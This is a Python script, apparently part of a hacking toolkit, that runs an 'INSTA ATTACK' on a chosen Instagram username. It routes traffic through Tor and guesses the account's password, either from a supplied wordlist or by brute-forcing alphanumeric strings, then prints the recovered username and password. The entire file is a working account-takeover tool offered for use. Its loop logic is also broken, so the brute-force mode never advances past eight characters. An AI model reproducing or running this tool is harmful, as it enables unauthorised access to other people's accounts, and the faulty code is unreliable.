from tools.social_tools.insta import login as insta
import os
import itertools

def main():
    os.system("clear")
    banner = """
            ==============================
             _   __    _      ___                   
            |_| |   \ | |    / __|  /\    
             _  | |\ \| |    \ \   /__\   
            | | | | \   |  __/ /  / __ \    
            |_| |_|  \__| |___/  /_/  \_\ 
                                          
            ========[INSTA ATTACK]========

    """
    print(banner)
    usr = input("[ENTER] enter the username: ")
    print("[INSTA] starting tor")
    pasd = input("[ENTER] enter unhashed password to accses tor: ")
    os.system("sudo /etc/init.d/tor restart")
    print("1) worlist")
    print("2) pybrute")
    cho = int(input("[ENTER] enter choice: "))

    if cho == 1:
        path = input("[ENTER] enter full path to password list: ")
        f = open(path,"r").readlines()
        count = 0
        mx = len(f)
        r = str(mx)
        for x in f:
            count += 1
            x = x.replace("\n","")
            print("[INSTA] attempt ("+str(count)+"/"+r+")")
            chk = insta(usr, x, pasd)
            if chk == True:
                os.system("clear")
                print(banner)
                print("[INSTA] got the user name and password")
                print("USR: ", usr)
                print("PSWD: ", x)
                print("[INSTA] got password after ("+str(count)+") attempts")
                input("[ENTER] hit enter to continue")
                break
            else:
                pass
    elif cho == 2:
        mx = 8
        while mx != 64:
            count = 0
            PASSWORD_LIST = itertools.product("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM", repeat=mx)

            for pas in PASSWORD_LIST:
                pas = str(pas)
                pas = pas.replace("')","")
                pas = pas.replace("('","")
                pas = pas.replace("'","")
                pas = pas.replace(" ","")
                pas = pas.replace(",","")
                #print(pas)
                u = str(pas)
                count += 1
                u = u.replace("\n","")
                print("[INSTA] attempt ("+str(count)+")")
                chk = insta(usr, u, pasd)
                if chk == True:
                    os.system("clear")
                    print(banner)
                    print("[INSTA] got the user name and password")
                    print("USR: ", usr)
                    print("PSWD: ", u)
                    print("[INSTA] got password after ("+str(count)+") attempts")
                    input("[ENTER] hit enter to continue")
                    break
                else:
                    pass
        mx = mx + 1
    else:
        pass
    print("[!] done!")